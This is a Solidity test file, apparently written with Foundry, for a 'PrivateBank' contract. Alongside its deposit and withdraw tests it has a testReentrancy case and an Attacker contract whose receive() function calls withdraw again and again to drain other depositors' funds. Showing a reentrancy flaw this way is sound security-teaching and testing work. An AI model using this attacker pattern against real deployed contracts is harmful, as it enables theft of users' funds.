// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/PrivateBank.sol";

contract PrivateBankTest is Test {
    PrivateBank bank;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address carol = makeAddr("carol");

    function setUp() public {
        // Prepare contracts
        bank = new PrivateBank();

        // Give ether
        vm.deal(alice, 1 ether);
        vm.deal(bob, 3 ether);
        vm.deal(carol, 5 ether);
    }

    function testDeposit() public {
        vm.startPrank(alice);
        uint256 amountDeposit = alice.balance;

        bank.deposit{value: amountDeposit}();

        assertEq(alice.balance, 0);
        assertEq(bank.getBalance(), amountDeposit);
        assertEq(bank.getUserBalance(alice), amountDeposit);
    }

    function testWithdraw() public {
        vm.startPrank(alice);
        uint256 amountDeposit = alice.balance;

        bank.deposit{value: amountDeposit}();
        bank.withdraw();

        assertEq(alice.balance, amountDeposit);
        assertEq(bank.getBalance(), 0);
        assertEq(bank.getUserBalance(alice), 0);
    }


    function testReentrancy() public {
        Attacker attacker = new Attacker(bank);

        // Fund the PrivateBank
        vm.prank(bob);
        bank.deposit{value: bob.balance}();
        vm.prank(carol);
        bank.deposit{value: carol.balance}();

        // Perform the attack
        vm.startPrank(alice);
        uint256 amountAttack = alice.balance;
        attacker.attack{value: amountAttack}();

        // Check that the attacker has more than they started with
        assert(address(attacker).balance > amountAttack);
    }
}

contract Attacker {
    PrivateBank bank;

    constructor(PrivateBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}